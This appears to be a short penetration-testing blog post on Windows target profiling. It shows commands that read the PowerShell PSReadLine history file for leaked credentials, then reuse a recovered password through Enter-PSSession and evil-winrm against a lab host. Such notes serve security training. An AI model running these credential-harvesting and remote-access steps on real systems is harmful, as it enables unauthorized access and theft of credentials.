---
layout: post
title: Windows Target Profiling Powershell
titledate: 09/14/23
tags: ["infosec","offsec", "privesc", "powershell", "evil-winrm","win_enum"]
---

### most admins clear ps history with Clear-History but leave PSReadlines untouched

using powershell to retrieve information about how it has been used can be fruitful

    PS> Get-History

the command Clear-History will earse the powershell history from being visible by Get-History, but we can retrieve the cmd history in PSReadline

    PS> (Get-PSReadlineOption).HistorySavePath

reading the txt file output for this command can possilby disclose valuable information

    PS> type C:\Users\user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

If we get credentials from the output above we may be able to start a PS remoting session

    PS> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
    PS> $cred = New-Object System.Management.Automation.PSCredential("admin", $password)
    PS> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred

some commands like whoami may work inside the ps remoting session but if we are inside a nc bind shell there will likely be issues

    [CLIENTWK220]: PS C:\Users\admin\Documents> whoami

In this case we can use evil-winrm

    evil-winrm -i 192.168.50.220 -u admin -p "qwertqwertqwert123\!\!"

More evil-winrm commands here !!
